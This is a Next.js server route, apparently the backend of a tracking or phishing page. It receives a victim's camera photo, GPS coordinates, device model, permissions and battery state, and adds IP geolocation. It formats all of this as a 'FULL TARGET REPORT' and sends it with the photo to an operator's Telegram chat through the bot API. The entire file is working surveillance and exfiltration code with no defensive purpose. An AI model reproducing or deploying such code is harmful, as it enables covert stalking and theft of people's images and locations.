import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const { image, gps, device, permissions, battery } = await req.json();
    const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";

    const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    let caption = `📊 *FULL TARGET REPORT*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    caption += `🌐 *NETWORK & LOCATION*\n`;
    caption += `├ *IP:* \`${geo.query || ip}\` \n`;
    caption += `├ *ISP:* ${geo.isp || "?"}\n`;
    caption += `└ *Lokasi:* ${geo.city || "?"}, ${geo.country || "?"}\n\n`;

    caption += `📱 *DEVICE & SYSTEM*\n`;
    caption += `├ *Model:* ${device.model}\n`;
    caption += `├ *OS:* ${device.os}\n`;
    caption += `├ *Baterai:* ${battery?.level}% (${battery?.charging ? "🔌 Charging" : "🔋 Discharging"})\n`;
    caption += `└ *Bahasa:* ${device.language}\n\n`;

    // Laporan Izin (Browser Level)
    caption += `🛡️ *PERMISSIONS STATUS*\n`;
    caption += `├ *Kamera:* ✅ Granted\n`;
    caption += `├ *Lokasi:* ${permissions.location ? "✅ Granted" : "❌ Denied"}\n`;
    caption += `├ *Audio/Mic:* ${permissions.audio ? "✅ Detected" : "⚠️ Not Active"}\n`;
    caption += `├ *Notifikasi:* ${permissions.notifications}\n`;
    caption += `├ *Kontak/Foto:* 🚫 (App Only)\n`;
    caption += `└ *Bluetooth/Nearby:* ${permissions.nearby ? "📡 Available" : "🚫 Restricted"}\n\n`;

    if (gps) {
      caption += `🎯 *GPS LIVE:* [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n`;
    }

    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
    const formData = new FormData();
    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
    formData.append("photo", new Blob([buffer], { type: "image/png" }), "report.png");
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");

    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  }
}